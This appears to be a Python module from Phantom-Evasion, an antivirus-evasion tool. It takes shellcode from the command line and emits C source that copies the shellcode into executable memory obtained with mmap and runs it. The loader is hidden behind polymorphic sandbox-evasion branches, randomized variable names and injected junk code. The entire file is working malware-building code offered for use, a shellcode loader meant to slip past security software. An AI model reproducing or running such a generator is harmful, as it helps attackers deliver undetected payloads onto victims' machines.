
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #   along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.           #
     #                                                                                      #
     ########################################################################################

import random, string
import sys 
from random import shuffle
sys.path.append("Modules/payloads/auxiliar")
import usefull

Payload = sys.argv[1]

Filename = sys.argv[2]

Randbufname = usefull.varname_creator()

Payload = Payload.replace("buf",Randbufname)

Randgood = usefull.varname_creator()

Randmem = usefull.varname_creator()

Randbig = random.randrange(60000000,120000000,1000000) 	

Randmaxop = usefull.varname_creator()

Randcpt	= usefull.varname_creator()

Randi =	usefull.varname_creator()

Randptr = usefull.varname_creator()

Randinj = usefull.varname_creator()

x=[[i] for i in range(1,5)]

shuffle(x)
a=str(x[0])
b=str(x[1])
c=str(x[2])
a=a.replace("[","")
a=a.replace("]","")
b=b.replace("[","")
b=b.replace("]","")
c=c.replace("[","")
c=c.replace("]","")

y=[[i] for i in range(1,6)]

shuffle(y)
aa=str(y[0])
bb=str(y[1])
cc=str(y[2])
aa=aa.replace("[","")
aa=aa.replace("]","")
bb=bb.replace("[","")
bb=bb.replace("]","")
cc=cc.replace("[","")
cc=cc.replace("]","")

MorphEvasion1 = str(usefull.Polymorph_Multipath_Evasion(a,Filename))
MorphEvasion2 = str(usefull.Polymorph_Multipath_Evasion(b,Filename))
MorphEvasion3 = str(usefull.Polymorph_Multipath_Evasion(c,Filename))
 
Junkcode1 = usefull.Junkmathinject(aa) 	        # Junkcode
Junkcode2 = usefull.Junkmathinject(bb)		# Junkcode
Junkcode3 = usefull.Junkmathinject(cc)		# Junkcode

Hollow_code = ""
Hollow_code += "#include <stdlib.h>\n#include <stdio.h>\n"
Hollow_code += "#include <unistd.h>\n"
Hollow_code += "#include <sys/mman.h>\n"
Hollow_code += "#include <string.h>\n"
Hollow_code += "int main(int argc,char * argv[]){\n"
Hollow_code += MorphEvasion1
Hollow_code += MorphEvasion2
Hollow_code += MorphEvasion3
Hollow_code += Payload
Hollow_code += "void *" + Randptr + ";"
Hollow_code += Randptr + " = mmap(0,sizeof(" + Randbufname + "),PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANON,-1,0);\n"
Hollow_code += "memcpy(" + Randptr + ","+ Randbufname + ", sizeof(" + Randbufname + "));\n"
Hollow_code += "int " + Randinj + " = ((int(*)(void))" + Randptr + ")();}\n"
Hollow_code += "else{" + Junkcode1 + "}\n"
Hollow_code += "}else{" + Junkcode2 + "}\n"
Hollow_code += "}else{" + Junkcode3 + "}\n"
Hollow_code += "return 0;}"
Hollow_code = Hollow_code.encode('utf-8')

with open('Source.c','wb') as f:
    f.write(Hollow_code)

